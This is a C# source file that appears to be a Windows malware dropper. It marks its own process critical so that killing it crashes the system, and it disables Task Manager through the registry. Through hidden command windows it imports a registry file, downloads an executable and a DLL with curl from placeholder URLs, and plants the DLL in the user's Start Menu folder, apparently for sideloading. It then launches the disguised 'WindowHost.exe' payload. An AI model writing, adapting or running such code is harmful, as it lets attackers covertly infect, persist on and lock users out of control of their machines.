using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Diagnostics;
using Microsoft.Win32;
using System.Security.Policy;
using System.Collections;
using System.Threading;

namespace Project1
{
    public class Class1
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        public static void Main()
        {
            int isCritical = 1;
            int BreakOnTermination = 0x1D;
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));

            Class1 prp = new Class1();
            prp.Prep();

            Class1 start_proc = new Class1();
            Thread start_proc_1 = new Thread(start_proc.SetUp);
            start_proc_1.Start();
        }
        public void Prep()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            key.SetValue("DisableTaskManager", 1, RegistryValueKind.DWord);
            key.Close();

            const string quote = "\"";
            ProcessStartInfo ctrl = new ProcessStartInfo();
            ctrl.FileName = "cmd.exe";
            ctrl.WindowStyle = ProcessWindowStyle.Hidden;
            ctrl.Arguments = @"/k regedit /s" + quote + @"C:\Program Files\Temp\disctrl.reg" + quote + " && exit";
            Process.Start(ctrl);
        }
        public void SetUp()
        {
            const string url_1 = "URL HERE"; //WINDOWHOST.EXE URL HERE
            ProcessStartInfo dwn_payload_1 = new ProcessStartInfo();
            dwn_payload_1.FileName = "cmd.exe";
            dwn_payload_1.WindowStyle = ProcessWindowStyle.Hidden;
            dwn_payload_1.Arguments = @"curl " + url_1 + @" -o C:\\ProgramData\\WindowHost.exe";
            Process.Start(dwn_payload_1);

            const string url_2 = "URL_TO_DLL"; //DLL URL HERE
            ProcessStartInfo dwn_paylod_2 = new ProcessStartInfo();
            dwn_paylod_2.FileName = "cmd.exe";
            dwn_paylod_2.WindowStyle = ProcessWindowStyle.Hidden;
            dwn_paylod_2.Arguments = @"curl " + url_2 + @" -o C:\\ProgramData\\cscapi.dll";
            Process.Start(dwn_paylod_2);
            
            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

            string dll_filename = "cscapi.dll";
            string tar_dll_dst = @"C:\Users\" + userName + @"AppData\Roaming\Microsoft\Windows\Start Menu\Programs";

            string current_dst = @"C:\\ProgramData";
            string curr_file_name = "cscapi.dll";

            string current_dll_path = System.IO.Path.Combine(current_dst, curr_file_name);
            string final_tar = System.IO.Path.Combine(tar_dll_dst, dll_filename);

            try
            {
                System.IO.File.Copy(current_dll_path, final_tar, true);
            }
            catch { }

            if(System.IO.File.Exists(@"C:\\ProgramData\\cscapi.dll"))
            {
                try
                {
                    System.IO.File.Delete(@"C:\\ProgramData\\cscapi.dll");
                }
                catch { }
            }

            try
            {
                ProcessStartInfo start_payload_1 = new ProcessStartInfo();
                start_payload_1.FileName = "cmd.exe";
                start_payload_1.WindowStyle = ProcessWindowStyle.Hidden;
                start_payload_1.Arguments = @"start C:\\ProgramData\\WindowHost.exe";
                Process.Start(start_payload_1);
            }
            catch { }
        }
    }
}
